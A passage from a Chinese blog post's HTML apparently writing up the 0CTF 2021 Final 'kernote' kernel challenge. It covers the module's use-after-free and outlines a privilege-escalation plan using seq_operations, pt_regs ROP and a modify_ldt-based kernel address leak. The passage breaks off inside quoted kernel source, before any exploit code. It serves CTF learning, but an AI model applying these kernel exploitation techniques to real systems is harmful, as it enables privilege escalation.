@@ -1,0 +1,1149 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="NkA6ndXFZC">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.xi4oyu.top","root":"/","images":"/images","scheme":"Gemini","version":"8.7.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="借此题来学习下 modify_ldt 在 linux kernel 中的利用思路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021-0CTF-FINAL-kernote">
+<meta property="og:url" content="http://www.xi4oyu.top/5b4f46e3/index.html">
+<meta property="og:site_name" content="feather&#39;s blog">
+<meta property="og:description" content="借此题来学习下 modify_ldt 在 linux kernel 中的利用思路">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.xi4oyu.top/images/5b4f46e3/pasted-0.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/5b4f46e3/pasted-1.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/5b4f46e3/pasted-3.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/5b4f46e3/pasted-2.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/5b4f46e3/pasted-4.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/5b4f46e3/pasted-5.png">
+<meta property="article:published_time" content="2022-03-21T05:47:00.000Z">
+<meta property="article:modified_time" content="2022-03-21T05:47:00.000Z">
+<meta property="article:author" content="feather">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.xi4oyu.top/images/5b4f46e3/pasted-0.png">
+
+
+<link rel="canonical" href="http://www.xi4oyu.top/5b4f46e3/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://www.xi4oyu.top/5b4f46e3/","path":"5b4f46e3/","title":"2021-0CTF-FINAL-kernote"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2021-0CTF-FINAL-kernote | feather's blog</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="feather's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">feather's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="nav-number">2.1.</span> <span class="nav-text">前置信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">逆向分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ADD"><span class="nav-number">2.2.1.</span> <span class="nav-text">ADD</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DELETE"><span class="nav-number">2.2.2.</span> <span class="nav-text">DELETE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SELECT"><span class="nav-number">2.2.3.</span> <span class="nav-text">SELECT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EDIT"><span class="nav-number">2.2.4.</span> <span class="nav-text">EDIT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SHOW"><span class="nav-number">2.2.5.</span> <span class="nav-text">SHOW</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">利用分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#modify-ldt"><span class="nav-number">3.1.</span> <span class="nav-text">modify_ldt</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#read-ldt"><span class="nav-number">3.1.1.</span> <span class="nav-text">read_ldt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#write-ldt"><span class="nav-number">3.1.2.</span> <span class="nav-text">write_ldt</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Leak"><span class="nav-number">3.2.</span> <span class="nav-text">Leak</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Bruteforce"><span class="nav-number">3.2.1.</span> <span class="nav-text">Bruteforce</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Searching"><span class="nav-number">3.2.2.</span> <span class="nav-text">Searching</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Safe-Leak"><span class="nav-number">3.2.3.</span> <span class="nav-text">Safe Leak</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP"><span class="nav-number">3.3.</span> <span class="nav-text">ROP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4-EXP"><span class="nav-number">3.4.</span> <span class="nav-text">完整 EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9E%E5%88%B0%E4%B8%80%E5%88%87%E5%BC%80%E5%A7%8B%E5%89%8D"><span class="nav-number">4.</span> <span class="nav-text">回到一切开始前</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="feather" src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">feather</p>
+  <div class="site-description" itemprop="description">计算机技术&个人琐碎事</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/featherl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;featherl" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:featherm@126.com" title="E-Mail → mailto:featherm@126.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://0x4qe.github.io/" title="https:&#x2F;&#x2F;0x4qe.github.io&#x2F;" rel="noopener" target="_blank">0x4qE</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wzyxv1n.top/" title="https:&#x2F;&#x2F;wzyxv1n.top&#x2F;" rel="noopener" target="_blank">转爷</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://github.red/" title="https:&#x2F;&#x2F;github.red&#x2F;" rel="noopener" target="_blank">茄皇</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://fl0.top/" title="http:&#x2F;&#x2F;fl0.top&#x2F;" rel="noopener" target="_blank">qz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://legr4ndk.github.io/" title="https:&#x2F;&#x2F;legr4ndk.github.io&#x2F;" rel="noopener" target="_blank">Legrandk</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.thesoldierjack.cn/" title="https:&#x2F;&#x2F;www.thesoldierjack.cn&#x2F;" rel="noopener" target="_blank">digger</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wr-web.github.io/" title="https:&#x2F;&#x2F;wr-web.github.io&#x2F;" rel="noopener" target="_blank">wr</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://annevi.cn/" title="https:&#x2F;&#x2F;annevi.cn&#x2F;" rel="noopener" target="_blank">annevi</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.zhouweitong.site/" title="http:&#x2F;&#x2F;www.zhouweitong.site&#x2F;" rel="noopener" target="_blank">obj</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.wz22.cc/" title="https:&#x2F;&#x2F;blog.wz22.cc&#x2F;" rel="noopener" target="_blank">Moesang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://me.liki.link/" title="https:&#x2F;&#x2F;me.liki.link&#x2F;" rel="noopener" target="_blank">kg</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cosmos.red/" title="https:&#x2F;&#x2F;cosmos.red&#x2F;" rel="noopener" target="_blank">boss-c</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jacksonyu1334.github.io/" title="https:&#x2F;&#x2F;jacksonyu1334.github.io" rel="noopener" target="_blank">jackson</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cjovi.icu/" title="https:&#x2F;&#x2F;cjovi.icu&#x2F;" rel="noopener" target="_blank">cj</a>
+        </li>
+    </ul>
+  </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.xi4oyu.top/5b4f46e3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="feather">
+      <meta itemprop="description" content="计算机技术&个人琐碎事">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="feather's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2021-0CTF-FINAL-kernote
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-03-21 13:47:00" itemprop="dateCreated datePublished" datetime="2022-03-21T13:47:00+08:00">2022-03-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/kernel/" itemprop="url" rel="index"><span itemprop="name">kernel</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>15k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>14 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>借此题来学习下 modify_ldt 在 linux kernel 中的利用思路</p>
+<span id="more"></span>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>出题人公开的题目附件以及wp：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote">https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote</a></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="前置信息"><a href="#前置信息" class="headerlink" title="前置信息"></a>前置信息</h3><p>题目提供了个  readme.md</p>
+<blockquote>
+<p>Here are some kernel config options in case you need it</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">CONFIG_SLAB&#x3D;y
+CONFIG_SLAB_FREELIST_RANDOM&#x3D;y
+CONFIG_SLAB_FREELIST_HARDENED&#x3D;y
+CONFIG_HARDENED_USERCOPY&#x3D;y
+CONFIG_STATIC_USERMODEHELPER&#x3D;y
+CONFIG_STATIC_USERMODEHELPER_PATH&#x3D;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>根据该文件可以知道，kernel 使用了 <strong>slab</strong> 而不是默认的 slub 分配器，并且开启了一些缓解措施：</p>
+<ol>
+<li><strong>SLAB_FREELIST_RANDOM</strong>，free_list 会存在打乱顺序的情况，取到的 object 不可预测（<strong>这里挖个小坑</strong>）</li>
+<li><strong>SLAB_FREELIST_HARDENED</strong>，free_list 的 next 指针将不是真实有效的 object 指针，简单描述就是 <code>object-&gt;next = object_addr ^ random ^ next_object_addr</code></li>
+<li><strong>HARDENED_USERCOPY</strong>，在使用 copy_to_user、copy_from_user 等函数时，会对内核空间的指针进行检查，对于内核 .text 地址空间，非堆栈空间，非 slab 分配的 object 空间的指针进行拷贝，会使得内核 panic</li>
+<li><strong>STATIC_USERMODEHELPER</strong>，modprobe_path 只读</li>
+</ol>
+<p>run.sh</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
+qemu-system-x86_64 <span class="token punctuation">\</span>
+-m 128M <span class="token punctuation">\</span>
+-kernel ./bzImage <span class="token punctuation">\</span>
+-hda ./rootfs.img <span class="token punctuation">\</span>
+-append <span class="token string">"console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on"</span> <span class="token punctuation">\</span>
+-monitor /dev/null <span class="token punctuation">\</span>
+-smp <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">2</span>,threads<span class="token operator">=</span><span class="token number">2</span> <span class="token punctuation">\</span>
+-nographic <span class="token punctuation">\</span>
+-cpu kvm64,+smep,+smap <span class="token punctuation">\</span>
+-no-reboot <span class="token punctuation">\</span>
+-snapshot <span class="token punctuation">\</span>
+-s
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>开启了 <strong>kaslr</strong>，<strong>kpti</strong></p>
+<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>漏洞模块 kernote.ko，只有一个 ioctl，且整个过程上自旋锁，根据 request（ioctl 第二个参数）进行不同的操作</p>
+<h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><p>request = 0x6667，从 <code>kmalloc_caches[5]</code> 也就是 <code>kmalloc-32</code> 中分配一个 object，存储到全局 buf 数组里<br><img src="/images/5b4f46e3/pasted-0.png" alt="note add"></p>
+<h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>request = 0x6668，释放指定 index 的 object，相关指针也置为了 NULL<br><img src="/images/5b4f46e3/pasted-1.png" alt="note delete"></p>
+<h4 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h4><p>request = 0x6666，复制指定 index 的指针到全局变量 note 里<br><img src="/images/5b4f46e3/pasted-3.png" alt="note select"></p>
+<h4 id="EDIT"><a href="#EDIT" class="headerlink" title="EDIT"></a>EDIT</h4><p>request = 0x6669，向 note 指针处写入 8 字节的 value<br><img src="/images/5b4f46e3/pasted-2.png" alt="note edit"></p>
+<h4 id="SHOW"><a href="#SHOW" class="headerlink" title="SHOW"></a>SHOW</h4><p>request = 0x666A，打印 note 指针指向的 8 字节值，但是前面有一些判断，其实就是判断当前用户是否为 root，只有为 root  才能用，所以这个功能没有用<br><img src="/images/5b4f46e3/pasted-4.png" alt="note show"><br><img src="/images/5b4f46e3/pasted-5.png" alt="note show print"></p>
+<hr>
+<p>显然这里存在一个 UAF，<strong>SELECT</strong> 后再 <strong>DELETE</strong>，此时 object 已经被释放，但是 <strong>EDIT</strong> 操作使用的 note 指针仍指向被释放的 object</p>
+<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>可以 UAF 32 字节的 object，且只能写入前 8 字节的数据</p>
+<p>首先可以想到的就是劫持 <strong>seq_operations</strong> 结构体的 start 指针，利用 <strong>pt_regs</strong> 结构体进行 ROP</p>
+<h3 id="modify-ldt"><a href="#modify-ldt" class="headerlink" title="modify_ldt"></a>modify_ldt</h3><p>但是还需要泄露内核地址，参考官方题解，了解到 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/include/asm/mmu_context.h#L36"><code>ldt_struct</code></a> 这么一个结构体</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*
+ * ldt_structs can be allocated, used, and freed, but they are never
+ * modified while live.
+ */</span>
+<span class="token keyword">struct</span> <span class="token class-name">ldt_struct</span> <span class="token punctuation">&#123;</span>
+	<span class="token comment">/*
+	 * Xen requires page-aligned LDTs with special permissions.  This is
+	 * needed to prevent us from installing evil descriptors such as
+	 * call gates.  On native, we could merge the ldt_struct and LDT
+	 * allocations, but it's not worth trying to optimize.
+	 */</span>
+	<span class="token keyword">struct</span> <span class="token class-name">desc_struct</span>	<span class="token operator">*</span>entries<span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>		nr_entries<span class="token punctuation">;</span>
+
+	<span class="token comment">/*
+	 * If PTI is in use, then the entries array is not mapped while we're
+	 * in user mode.  The whole array will be aliased at the addressed
+	 * given by ldt_slot_va(slot).  We use two slots so that we can allocate
+	 * and map, and enable a new LDT without invalidating the mapping
+	 * of an older, still-in-use LDT.
+	 *
+	 * slot will be -1 if this LDT doesn't have an alias mapping.
+	 */</span>
+	<span class="token keyword">int</span>			slot<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>大小为 32 字节，entries 指向 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/include/asm/desc_defs.h#L16"><code>desc_struct</code></a> 段描述符：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* 8 byte segment descriptor */</span>
+<span class="token keyword">struct</span> <span class="token class-name">desc_struct</span> <span class="token punctuation">&#123;</span>
+	u16	limit0<span class="token punctuation">;</span>
+	u16	base0<span class="token punctuation">;</span>
+	u16	base1<span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span> type<span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span> s<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> dpl<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>
+	u16	limit1<span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span> avl<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> d<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> g<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> base2<span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><del>不了解段描述符是什么东西的读者可以复习下操作系统课程</del></p>
+<p>linux 还提供了一个系统调用<a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/kernel/ldt.c#L659"><code>modify_ldt</code></a>来修改 <code>ldt_struct</code>：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">SYSCALL_DEFINE3</span><span class="token punctuation">(</span>modify_ldt<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token punctuation">,</span> func <span class="token punctuation">,</span> <span class="token keyword">void</span> __user <span class="token operator">*</span> <span class="token punctuation">,</span> ptr <span class="token punctuation">,</span>
+		<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token punctuation">,</span> bytecount<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token operator">-</span>ENOSYS<span class="token punctuation">;</span>
+
+	<span class="token keyword">switch</span> <span class="token punctuation">(</span>func<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>
+		ret <span class="token operator">=</span> <span class="token function">read_ldt</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> bytecount<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">break</span><span class="token punctuation">;</span>
+	<span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
+		ret <span class="token operator">=</span> <span class="token function">write_ldt</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> bytecount<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">break</span><span class="token punctuation">;</span>
+	<span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
+		ret <span class="token operator">=</span> <span class="token function">read_default_ldt</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> bytecount<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">break</span><span class="token punctuation">;</span>
+	<span class="token keyword">case</span> <span class="token number">0x11</span><span class="token operator">:</span>
+		ret <span class="token operator">=</span> <span class="token function">write_ldt</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> bytecount<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">break</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token comment">/*
+	 * The SYSCALL_DEFINE() macros give us an 'unsigned long'
+	 * return type, but tht ABI for sys_modify_ldt() expects
+	 * 'int'.  This cast gives us an int-sized value in %rax
+	 * for the return code.  The 'unsigned' is necessary so
+	 * the compiler does not try to sign-extend the negative
+	 * return codes into the high half of the register when
+	 * taking the value from int->long.
+	 */</span>
+	<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>ret<span class="token punctuation">;</span>
